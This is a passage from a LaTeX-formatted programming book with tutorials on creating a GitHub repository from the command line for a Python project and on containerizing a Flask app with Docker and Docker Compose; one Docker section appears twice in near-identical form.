  committing.
\end{enumerate}

\section{Conclusion}\label{conclusion-57}

This deep dive tutorial covered the essential aspects of using Git on a
local machine, including a full-length Python project example. By
mastering these concepts, you can effectively manage your codebase and
collaborate with others.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial on Creating a GitHub Repository from the
Command Line for a Python
Project}\label{deep-dive-tutorial-on-creating-a-github-repository-from-the-command-line-for-a-python-project}

In this tutorial, we'll go through the steps of creating a GitHub
repository directly from the command line for a Python project. We'll
cover the process of setting up a new Python project, initializing a
local Git repository, creating a remote repository on GitHub, and
pushing the local repository to GitHub.

\section{Table of Contents}\label{table-of-contents-26}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[prerequisites]{Prerequisites}
\item
  \hyperref[setting-up-the-python-project]{Setting Up the Python
  Project}
\item
  \hyperref[initializing-a-local-git-repository]{Initializing a Local
  Git Repository}
\item
  \hyperref[creating-a-remote-github-repository-from-the-command-line]{Creating
  a Remote GitHub Repository from the Command Line}
\item
  \hyperref[linking-local-repository-to-remote-repository]{Linking Local
  Repository to Remote Repository}
\item
  \hyperref[pushing-local-repository-to-github]{Pushing Local Repository
  to GitHub}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Prerequisites}\label{prerequisites-2}

Before you start, ensure you have the following installed and set up:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Git}: Download and install from
  \href{https://git-scm.com/}{git-scm.com}.
\item
  \textbf{GitHub Account}: Create an account on
  \href{https://github.com/}{GitHub}.
\item
  \textbf{GitHub CLI (gh)}: Install the GitHub CLI from
  \href{https://cli.github.com/}{cli.github.com}.
\end{enumerate}

You can install the GitHub CLI using Homebrew on macOS:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{brew}\NormalTok{ install gh}
\end{Highlighting}
\end{Shaded}

Or on Windows using the installer from the GitHub CLI website, or using
Scoop:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{scoop}\NormalTok{ install gh}
\end{Highlighting}
\end{Shaded}

For Linux, follow the instructions on the GitHub CLI website.

\section{Setting Up the Python
Project}\label{setting-up-the-python-project}

First, create a new directory for your Python project and set up a basic
structure.

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{mkdir}\NormalTok{ my\_python\_project}
\BuiltInTok{cd}\NormalTok{ my\_python\_project}
\FunctionTok{mkdir}\NormalTok{ src tests}
\FunctionTok{touch}\NormalTok{ src/\_\_init\_\_.py tests/\_\_init\_\_.py}
\end{Highlighting}
\end{Shaded}

Create a simple Python script \texttt{src/app.py}:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# src/app.py}
\KeywordTok{def}\NormalTok{ greet(name):}
    \ControlFlowTok{return} \SpecialStringTok{f"Hello, }\SpecialCharTok{\{}\NormalTok{name}\SpecialCharTok{\}}\SpecialStringTok{!"}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(greet(}\StringTok{"World"}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

Create a test file \texttt{tests/test\_app.py}:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# tests/test\_app.py}
\ImportTok{import}\NormalTok{ unittest}
\ImportTok{from}\NormalTok{ src.app }\ImportTok{import}\NormalTok{ greet}

\KeywordTok{class}\NormalTok{ TestApp(unittest.TestCase):}
    \KeywordTok{def}\NormalTok{ test\_greet(}\VariableTok{self}\NormalTok{):}
        \VariableTok{self}\NormalTok{.assertEqual(greet(}\StringTok{"World"}\NormalTok{), }\StringTok{"Hello, World!"}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    unittest.main()}
\end{Highlighting}
\end{Shaded}

\section{Initializing a Local Git
Repository}\label{initializing-a-local-git-repository}

Navigate to your project directory and initialize a new Git repository:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ my\_python\_project}
\FunctionTok{git}\NormalTok{ init}
\end{Highlighting}
\end{Shaded}

Add the project files to the repository:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ add .}
\end{Highlighting}
\end{Shaded}

Commit the files:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ commit }\AttributeTok{{-}m} \StringTok{"Initial commit"}
\end{Highlighting}
\end{Shaded}

\section{Creating a Remote GitHub Repository from the Command
Line}\label{creating-a-remote-github-repository-from-the-command-line}

Use the GitHub CLI to create a new repository on GitHub. First,
authenticate with GitHub:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{gh}\NormalTok{ auth login}
\end{Highlighting}
\end{Shaded}

Follow the prompts to log in and authenticate.

Next, create the GitHub repository:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{gh}\NormalTok{ repo create my\_python\_project }\AttributeTok{{-}{-}public} \AttributeTok{{-}{-}source}\OperatorTok{=}\NormalTok{. }\AttributeTok{{-}{-}remote}\OperatorTok{=}\NormalTok{origin}
\end{Highlighting}
\end{Shaded}

Explanation of the flags: - \texttt{-\/-public}: Makes the repository
public. Use \texttt{-\/-private} if you want a private repository. -
\texttt{-\/-source=.}: Specifies the current directory as the source. -
\texttt{-\/-remote=origin}: Sets the remote name to \texttt{origin}.

\section{Linking Local Repository to Remote
Repository}\label{linking-local-repository-to-remote-repository}

This step is automatically handled by the \texttt{gh\ repo\ create}
command with the \texttt{-\/-remote=origin} flag. However, if you need
to do it manually, you can add the remote URL to your local Git
repository using:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ remote add origin https://github.com/your\_username/my\_python\_project.git}
\end{Highlighting}
\end{Shaded}

\section{Pushing Local Repository to
GitHub}\label{pushing-local-repository-to-github}

Push the local repository to GitHub:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{git}\NormalTok{ push }\AttributeTok{{-}u}\NormalTok{ origin main}
\end{Highlighting}
\end{Shaded}

This command pushes the local \texttt{main} branch to the
\texttt{origin} remote and sets up tracking, so future
\texttt{git\ push} commands will know where to push changes.

\section{Conclusion}\label{conclusion-58}

Congratulations! You've successfully created a GitHub repository from
the command line and pushed a Python project to it. Here's a summary of
the steps:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Set up your Python project.
\item
  Initialize a local Git repository.
\item
  Use the GitHub CLI to create a remote repository on GitHub.
\item
  Link the local repository to the remote repository.
\item
  Push the local repository to GitHub.
\end{enumerate}

By mastering these steps, you can efficiently manage your projects and
collaborate with others using Git and GitHub.

\bookmarksetup{startatroot}

\chapter{Using Docker}\label{using-docker}

\section{Introduction to Docker with
Python}\label{introduction-to-docker-with-python}

Docker is a powerful platform that allows you to create, deploy, and run
applications in isolated containers. Containers are lightweight,
portable, and ensure that your application runs consistently regardless
of the environment. This tutorial will introduce you to Docker,
demonstrate how to containerize a Python application, and manage Docker
containers.

\subsection{Installing Docker}\label{installing-docker}

First, you need to install Docker. You can download and install Docker
from the \href{https://www.docker.com/products/docker-desktop}{official
Docker website}.

\subsection{Docker Basics}\label{docker-basics}

\subsubsection{Key Concepts}\label{key-concepts-2}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Image}: A lightweight, standalone, executable package that
  includes everything needed to run a piece of software, including the
  code, runtime, libraries, and dependencies.
\item
  \textbf{Container}: A runnable instance of an image. You can create,
  start, stop, move, and delete a container using the Docker API or CLI.
\item
  \textbf{Dockerfile}: A text file that contains a series of
  instructions on how to build a Docker image.
\end{enumerate}

\subsection{Containerizing a Python
Application}\label{containerizing-a-python-application}

Let's create a simple Python application and containerize it using
Docker.

\subsubsection{Step 1: Create a Simple Python
Application}\label{step-1-create-a-simple-python-application}

Create a directory for your project and add a Python script:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{mkdir}\NormalTok{ docker{-}python{-}app}
\BuiltInTok{cd}\NormalTok{ docker{-}python{-}app}
\end{Highlighting}
\end{Shaded}

Create a file named \texttt{app.py} with the following content:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# app.py}
\ImportTok{from}\NormalTok{ flask }\ImportTok{import}\NormalTok{ Flask}

\NormalTok{app }\OperatorTok{=}\NormalTok{ Flask(}\VariableTok{\_\_name\_\_}\NormalTok{)}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/\textquotesingle{}}\NormalTok{)}
\KeywordTok{def}\NormalTok{ hello\_world():}
    \ControlFlowTok{return} \StringTok{\textquotesingle{}Hello, Docker!\textquotesingle{}}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    app.run(host}\OperatorTok{=}\StringTok{\textquotesingle{}0.0.0.0\textquotesingle{}}\NormalTok{, port}\OperatorTok{=}\DecValTok{5000}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Create a \texttt{requirements.txt} file with the following content:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{flask}
\end{Highlighting}
\end{Shaded}

\subsubsection{Step 2: Create a
Dockerfile}\label{step-2-create-a-dockerfile}

Create a file named \texttt{Dockerfile} in the project directory with
the following content:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Use the official Python image from the Docker Hub}
\KeywordTok{FROM}\NormalTok{ python:3.9{-}slim}

\CommentTok{\# Set the working directory in the container}
\KeywordTok{WORKDIR}\NormalTok{ /app}

\CommentTok{\# Copy the current directory contents into the container at /app}
\KeywordTok{COPY}\NormalTok{ . /app}

\CommentTok{\# Install the required packages}
\KeywordTok{RUN} \ExtensionTok{pip}\NormalTok{ install }\AttributeTok{{-}{-}no{-}cache{-}dir} \AttributeTok{{-}r}\NormalTok{ requirements.txt}

\CommentTok{\# Make port 5000 available to the world outside this container}
\KeywordTok{EXPOSE}\NormalTok{ 5000}

\CommentTok{\# Define the command to run the application}
\KeywordTok{CMD}\NormalTok{ [}\StringTok{"python"}\NormalTok{, }\StringTok{"app.py"}\NormalTok{]}
\end{Highlighting}
\end{Shaded}

\subsubsection{Step 3: Build the Docker
Image}\label{step-3-build-the-docker-image}

Open a terminal, navigate to your project directory, and run the
following command to build the Docker image:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ build }\AttributeTok{{-}t}\NormalTok{ docker{-}python{-}app .}
\end{Highlighting}
\end{Shaded}

\subsubsection{Step 4: Run the Docker
Container}\label{step-4-run-the-docker-container}

Run the following command to start a container from the image you built:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ run }\AttributeTok{{-}d} \AttributeTok{{-}p}\NormalTok{ 5000:5000 docker{-}python{-}app}
\end{Highlighting}
\end{Shaded}

This command runs the container in detached mode (\texttt{-d}) and maps
port 5000 on your host to port 5000 in the container
(\texttt{-p\ 5000:5000}).

\subsubsection{Step 5: Test the
Application}\label{step-5-test-the-application}

Open a web browser and go to \texttt{http://localhost:5000}. You should
see the message ``Hello, Docker!''.

\subsection{Managing Docker
Containers}\label{managing-docker-containers}

\subsubsection{List Running Containers}\label{list-running-containers}

To list all running containers, use the following command:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ ps}
\end{Highlighting}
\end{Shaded}

\subsubsection{Stop a Container}\label{stop-a-container}

To stop a running container, use the \texttt{docker\ stop} command
followed by the container ID or name:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ stop }\OperatorTok{\textless{}}\NormalTok{container\_id}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsubsection{Remove a Container}\label{remove-a-container}

To remove a container, use the \texttt{docker\ rm} command followed by
the container ID or name:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ rm }\OperatorTok{\textless{}}\NormalTok{container\_id}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsection{Docker Compose}\label{docker-compose}

Docker Compose is a tool for defining and running multi-container Docker
applications. With Compose, you use a YAML file to configure your
application's services. Then, with a single command, you create and
start all the services from your configuration.

\subsubsection{\texorpdfstring{Step 1: Create a
\texttt{docker-compose.yml}
File}{Step 1: Create a docker-compose.yml File}}\label{step-1-create-a-docker-compose.yml-file}

Create a file named \texttt{docker-compose.yml} in your project
directory with the following content:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{version}\KeywordTok{:}\AttributeTok{ }\StringTok{\textquotesingle{}3\textquotesingle{}}
\FunctionTok{services}\KeywordTok{:}
\AttributeTok{  }\FunctionTok{web}\KeywordTok{:}
\AttributeTok{    }\FunctionTok{build}\KeywordTok{:}\AttributeTok{ .}
\AttributeTok{    }\FunctionTok{ports}\KeywordTok{:}
\AttributeTok{      }\KeywordTok{{-}}\AttributeTok{ }\StringTok{"5000:5000"}
\end{Highlighting}
\end{Shaded}

\subsubsection{Step 2: Run Docker
Compose}\label{step-2-run-docker-compose}

Run the following command to start the application:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker{-}compose}\NormalTok{ up}
\end{Highlighting}
\end{Shaded}

This command builds the image (if it hasn't been built already) and
starts the services defined in the \texttt{docker-compose.yml} file.

\subsubsection{Step 3: Stop Docker
Compose}\label{step-3-stop-docker-compose}

To stop the application, run:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker{-}compose}\NormalTok{ down}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-59}

Docker simplifies the process of developing, shipping, and running
applications by using containerization. By containerizing your Python
application, you ensure it runs consistently across different
environments. Docker Compose further simplifies managing multi-container
applications. Mastering Docker can greatly enhance your development
workflow, making your applications more portable, scalable, and easier
to manage. \#\# Introduction to Docker with Python

Docker is a powerful platform that allows you to create, deploy, and run
applications in isolated containers. Containers are lightweight,
portable, and ensure that your application runs consistently regardless
of the environment. This tutorial will introduce you to Docker,
demonstrate how to containerize a Python application, and manage Docker
containers.

\subsection{Installing Docker}\label{installing-docker-1}

First, you need to install Docker. You can download and install Docker
from the \href{https://www.docker.com/products/docker-desktop}{official
Docker website}.

\subsection{Docker Basics}\label{docker-basics-1}

\subsubsection{Key Concepts}\label{key-concepts-3}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Image}: A lightweight, standalone, executable package that
  includes everything needed to run a piece of software, including the
  code, runtime, libraries, and dependencies.
\item
  \textbf{Container}: A runnable instance of an image. You can create,
  start, stop, move, and delete a container using the Docker API or CLI.
\item
  \textbf{Dockerfile}: A text file that contains a series of
  instructions on how to build a Docker image.
\end{enumerate}

\subsection{Containerizing a Python
Application}\label{containerizing-a-python-application-1}

Let's create a simple Python application and containerize it using
Docker.

\subsubsection{Step 1: Create a Simple Python
Application}\label{step-1-create-a-simple-python-application-1}

Create a directory for your project and add a Python script:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{mkdir}\NormalTok{ docker{-}python{-}app}
\BuiltInTok{cd}\NormalTok{ docker{-}python{-}app}
\end{Highlighting}
\end{Shaded}

Create a file named \texttt{app.py} with the following content:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# app.py}
\ImportTok{from}\NormalTok{ flask }\ImportTok{import}\NormalTok{ Flask}

\NormalTok{app }\OperatorTok{=}\NormalTok{ Flask(}\VariableTok{\_\_name\_\_}\NormalTok{)}

\AttributeTok{@app.route}\NormalTok{(}\StringTok{\textquotesingle{}/\textquotesingle{}}\NormalTok{)}
\KeywordTok{def}\NormalTok{ hello\_world():}
    \ControlFlowTok{return} \StringTok{\textquotesingle{}Hello, Docker!\textquotesingle{}}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{\textquotesingle{}\_\_main\_\_\textquotesingle{}}\NormalTok{:}
\NormalTok{    app.run(host}\OperatorTok{=}\StringTok{\textquotesingle{}0.0.0.0\textquotesingle{}}\NormalTok{, port}\OperatorTok{=}\DecValTok{5000}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Create a \texttt{requirements.txt} file with the following content:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{flask}
\end{Highlighting}
\end{Shaded}

\subsubsection{Step 2: Create a
Dockerfile}\label{step-2-create-a-dockerfile-1}

Create a file named \texttt{Dockerfile} in the project directory with
the following content:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Use the official Python image from the Docker Hub}
\KeywordTok{FROM}\NormalTok{ python:3.9{-}slim}

\CommentTok{\# Set the working directory in the container}
\KeywordTok{WORKDIR}\NormalTok{ /app}

\CommentTok{\# Copy the current directory contents into the container at /app}
\KeywordTok{COPY}\NormalTok{ . /app}

\CommentTok{\# Install the required packages}
\KeywordTok{RUN} \ExtensionTok{pip}\NormalTok{ install }\AttributeTok{{-}{-}no{-}cache{-}dir} \AttributeTok{{-}r}\NormalTok{ requirements.txt}

\CommentTok{\# Make port 5000 available to the world outside this container}
\KeywordTok{EXPOSE}\NormalTok{ 5000}

\CommentTok{\# Define the command to run the application}
\KeywordTok{CMD}\NormalTok{ [}\StringTok{"python"}\NormalTok{, }\StringTok{"app.py"}\NormalTok{]}
\end{Highlighting}
\end{Shaded}

\subsubsection{Step 3: Build the Docker
Image}\label{step-3-build-the-docker-image-1}

Open a terminal, navigate to your project directory, and run the
following command to build the Docker image:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ build }\AttributeTok{{-}t}\NormalTok{ docker{-}python{-}app .}
\end{Highlighting}
\end{Shaded}

\subsubsection{Step 4: Run the Docker
Container}\label{step-4-run-the-docker-container-1}

Run the following command to start a container from the image you built:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ run }\AttributeTok{{-}d} \AttributeTok{{-}p}\NormalTok{ 5000:5000 docker{-}python{-}app}
\end{Highlighting}
\end{Shaded}

This command runs the container in detached mode (\texttt{-d}) and maps
port 5000 on your host to port 5000 in the container
(\texttt{-p\ 5000:5000}).

\subsubsection{Step 5: Test the
Application}\label{step-5-test-the-application-1}

Open a web browser and go to \texttt{http://localhost:5000}. You should
see the message ``Hello, Docker!''.

\subsection{Managing Docker
Containers}\label{managing-docker-containers-1}

\subsubsection{List Running Containers}\label{list-running-containers-1}

To list all running containers, use the following command:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ ps}
\end{Highlighting}
\end{Shaded}

\subsubsection{Stop a Container}\label{stop-a-container-1}

To stop a running container, use the \texttt{docker\ stop} command
followed by the container ID or name:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ stop }\OperatorTok{\textless{}}\NormalTok{container\_id}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsubsection{Remove a Container}\label{remove-a-container-1}

To remove a container, use the \texttt{docker\ rm} command followed by
the container ID or name:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ rm }\OperatorTok{\textless{}}\NormalTok{container\_id}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsection{Docker Compose}\label{docker-compose-1}

Docker Compose is a tool for defining and running multi-container Docker
applications. With Compose, you use a YAML file to configure your
application's services. Then, with a single command, you create and
start all the services from your configuration.

\subsubsection{\texorpdfstring{Step 1: Create a
\texttt{docker-compose.yml}
File}{Step 1: Create a docker-compose.yml File}}\label{step-1-create-a-docker-compose.yml-file-1}

Create a file named \texttt{docker-compose.yml} in your project
directory with the following content:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{version}\KeywordTok{:}\AttributeTok{ }\StringTok{\textquotesingle{}3\textquotesingle{}}
\FunctionTok{services}\KeywordTok{:}
\AttributeTok{  }\FunctionTok{web}\KeywordTok{:}
\AttributeTok{    }\FunctionTok{build}\KeywordTok{:}\AttributeTok{ .}
\AttributeTok{    }\FunctionTok{ports}\KeywordTok{:}
\AttributeTok{      }\KeywordTok{{-}}\AttributeTok{ }\StringTok{"5000:5000"}
\end{Highlighting}
\end{Shaded}

\subsubsection{Step 2: Run Docker
Compose}\label{step-2-run-docker-compose-1}

Run the following command to start the application:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker{-}compose}\NormalTok{ up}
\end{Highlighting}
\end{Shaded}

This command builds the image (if it hasn't been built already) and
starts the services defined in the \texttt{docker-compose.yml} file.

\subsubsection{Step 3: Stop Docker
Compose}\label{step-3-stop-docker-compose-1}

To stop the application, run:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker{-}compose}\NormalTok{ down}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-60}

Docker simplifies the process of developing, shipping, and running
applications by using containerization. By containerizing your Python
application, you ensure it runs consistently across different
environments. Docker Compose further simplifies managing multi-container
applications. Mastering Docker can greatly enhance your development
workflow, making your applications more portable, scalable, and easier
to manage.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial on
Docker}\label{deep-dive-tutorial-on-docker}

\section{Table of Contents}\label{table-of-contents-27}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-docker]{Introduction to Docker}
\item
  \hyperref[installing-docker]{Installing Docker}
\item
  \hyperref[basic-docker-concepts]{Basic Docker Concepts}
\item
  \hyperref[working-with-docker-images]{Working with Docker Images}
\item
  \hyperref[creating-and-running-docker-containers]{Creating and Running
  Docker Containers}
\item
  \hyperref[docker-networking]{Docker Networking}
\item
  \hyperref[docker-volumes]{Docker Volumes}
\item
  \hyperref[docker-compose]{Docker Compose}
\item
  \hyperref[dockerfile-building-custom-images]{Dockerfile: Building
  Custom Images}
\item
  \hyperref[best-practices-and-tips]{Best Practices and Tips}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Docker}\label{introduction-to-docker}

Docker is a platform that allows developers to automate the deployment
of applications inside lightweight, portable containers. Containers
include everything needed to run an application, making it easy to
deploy on any environment.

\subsection{Why Use Docker?}\label{why-use-docker}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Consistency}: Ensures that your application runs the same in
  development, testing, and production.
\item
  \textbf{Isolation}: Provides isolated environments for applications,
  preventing conflicts.
\item
  \textbf{Efficiency}: Containers are lightweight and share the host OS
  kernel, making them more efficient than virtual machines.
\item
  \textbf{Portability}: Containers can run anywhere, from your local
  machine to cloud environments.
\end{enumerate}

\section{Installing Docker}\label{installing-docker-2}

Docker can be installed on various operating systems, including Windows,
macOS, and Linux.

\subsection{Windows and macOS}\label{windows-and-macos}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Download Docker Desktop from the
  \href{https://www.docker.com/products/docker-desktop}{Docker website}.
\item
  Run the installer and follow the installation instructions.
\item
  After installation, Docker Desktop will start automatically. You can
  check the installation by running:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker} \AttributeTok{{-}{-}version}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\subsection{Linux}\label{linux-2}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Update your package database:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ apt{-}get update}
\end{Highlighting}
\end{Shaded}
\item
  Install Docker:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ apt{-}get install docker{-}ce docker{-}ce{-}cli containerd.io}
\end{Highlighting}
\end{Shaded}
\item
  Verify the installation:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ docker }\AttributeTok{{-}{-}version}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\section{Basic Docker Concepts}\label{basic-docker-concepts}

\subsection{Docker Images}\label{docker-images}

A Docker image is a lightweight, standalone, and executable software
package that includes everything needed to run a piece of software,
including code, runtime, libraries, environment variables, and
configuration files.

\subsection{Docker Containers}\label{docker-containers}

A Docker container is a runtime instance of an image. It includes the
application and all its dependencies but shares the kernel with other
containers, running as isolated processes on the host operating system.

\subsection{Docker Hub}\label{docker-hub}

Docker Hub is a cloud-based registry service for finding and sharing
container images. You can use Docker Hub to distribute your images.

\section{Working with Docker Images}\label{working-with-docker-images}

\subsection{Pulling an Image}\label{pulling-an-image}

To pull an image from Docker Hub, use the \texttt{docker\ pull} command:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ pull hello{-}world}
\end{Highlighting}
\end{Shaded}

\subsection{Listing Images}\label{listing-images}

To list all downloaded images, use the \texttt{docker\ images} command:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ images}
\end{Highlighting}
\end{Shaded}

\subsection{Removing an Image}\label{removing-an-image}

To remove an image, use the \texttt{docker\ rmi} command followed by the
image ID or name:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ rmi hello{-}world}
\end{Highlighting}
\end{Shaded}

\section{Creating and Running Docker
Containers}\label{creating-and-running-docker-containers}

\subsection{Running a Container}\label{running-a-container}

To create and run a container from an image, use the
\texttt{docker\ run} command:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ run hello{-}world}
\end{Highlighting}
\end{Shaded}

This command will create a new container from the \texttt{hello-world}
image and run it.

\subsection{Listing Containers}\label{listing-containers}

To list all running containers, use the \texttt{docker\ ps} command:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ ps}
\end{Highlighting}
\end{Shaded}

To list all containers (running and stopped), use:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ ps }\AttributeTok{{-}a}
\end{Highlighting}
\end{Shaded}

\subsection{Stopping a Container}\label{stopping-a-container}

To stop a running container, use the \texttt{docker\ stop} command
followed by the container ID or name:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ stop }\OperatorTok{\textless{}}\NormalTok{container\_id}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\subsection{Removing a Container}\label{removing-a-container}

To remove a stopped container, use the \texttt{docker\ rm} command
followed by the container ID or name:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ rm }\OperatorTok{\textless{}}\NormalTok{container\_id}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\section{Docker Networking}\label{docker-networking}

Docker provides several networking options to manage communication
between containers.

\subsection{Bridge Network}\label{bridge-network}

The default network for containers. Containers on the same bridge
network can communicate with each other.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ network ls}
\ExtensionTok{docker}\NormalTok{ network create my{-}bridge{-}network}
\ExtensionTok{docker}\NormalTok{ run }\AttributeTok{{-}{-}network}\NormalTok{ my{-}bridge{-}network }\AttributeTok{{-}{-}name}\NormalTok{ my{-}container my{-}image}
\end{Highlighting}
\end{Shaded}

\subsection{Host Network}\label{host-network}

Uses the host's network stack directly.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ run }\AttributeTok{{-}{-}network}\NormalTok{ host my{-}image}
\end{Highlighting}
\end{Shaded}

\subsection{Overlay Network}\label{overlay-network}

Used for multi-host networking in a Docker Swarm cluster.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ network create }\AttributeTok{{-}d}\NormalTok{ overlay my{-}overlay{-}network}
\end{Highlighting}
\end{Shaded}

\section{Docker Volumes}\label{docker-volumes}

Volumes are used to persist data generated by and used by Docker
containers.

\subsection{Creating a Volume}\label{creating-a-volume}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ volume create my{-}volume}
\end{Highlighting}
\end{Shaded}

\subsection{Using a Volume}\label{using-a-volume}

Mount a volume to a container:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ run }\AttributeTok{{-}v}\NormalTok{ my{-}volume:/app/data my{-}image}
\end{Highlighting}
\end{Shaded}

\subsection{Listing Volumes}\label{listing-volumes}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ volume ls}
\end{Highlighting}
\end{Shaded}

\subsection{Removing a Volume}\label{removing-a-volume}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ volume rm my{-}volume}
\end{Highlighting}
\end{Shaded}

\section{Docker Compose}\label{docker-compose-2}

Docker Compose is a tool for defining and running multi-container Docker
applications.

\subsection{\texorpdfstring{Creating a \texttt{docker-compose.yml}
File}{Creating a docker-compose.yml File}}\label{creating-a-docker-compose.yml-file}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{version}\KeywordTok{:}\AttributeTok{ }\StringTok{\textquotesingle{}3\textquotesingle{}}
\FunctionTok{services}\KeywordTok{:}
\AttributeTok{  }\FunctionTok{web}\KeywordTok{:}
\AttributeTok{    }\FunctionTok{image}\KeywordTok{:}\AttributeTok{ nginx}
\AttributeTok{    }\FunctionTok{ports}\KeywordTok{:}
\AttributeTok{      }\KeywordTok{{-}}\AttributeTok{ }\StringTok{"80:80"}
\AttributeTok{  }\FunctionTok{db}\KeywordTok{:}
\AttributeTok{    }\FunctionTok{image}\KeywordTok{:}\AttributeTok{ postgres}
\AttributeTok{    }\FunctionTok{environment}\KeywordTok{:}
